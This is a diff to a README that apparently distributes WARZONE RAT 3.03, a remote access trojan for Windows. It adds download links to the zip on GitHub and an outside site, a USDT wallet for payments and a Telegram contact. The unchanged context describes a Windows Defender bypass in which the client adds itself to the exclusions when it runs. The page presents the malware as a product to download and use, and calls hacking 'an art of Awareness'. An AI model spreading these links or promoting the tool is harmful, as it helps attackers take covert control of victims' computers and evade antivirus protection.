@@ -2,11 +2,13 @@
 Hacking is not a crime - It's an art of Awareness. 
 
 
+[![DigitalOcean Referral Badge](https://web-platforms.sfo2.cdn.digitaloceanspaces.com/WWW/Badge%201.svg)](https://www.digitalocean.com)
+
 ## Supported OS:
 XP, Vista, 7, 8, 8.1, 10 - 32 bit and 64 bit
 
 ### DEMO VIDEO 
-
+https://streamable.com/lryi8m?t=15&src=player-page-share
 
 ## Features
 Native, independent stub
@@ -85,11 +87,20 @@ Windows Defender Bypass
 WARZONE Client will add itself to exclusions once it executes.
 This will prevent Windows Defender from scanning your WARZONE Client.
 
-# Donation
-Donation : stripe 
 
+# Donation : payment methods 
+Usdt(TRC-20)
+# TNMKWZmwoJuaXLoSW1AYBaKaETnkZ5bHi9
 
 # File download
 # github  server
+[WARZONERAT3.03.zip](https://github.com/TariqullslamHridoy/WARZONERAT3.03/files/12388581/WARZONERAT3.03.zip)
+
 # download Website
+https://dailybangla.press/WARZONERAT3.03.zip
+
+## telegram
+[![Telegram](https://img.shields.io/badge/Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://telegram.me/ROOT_404X)
+
+
 
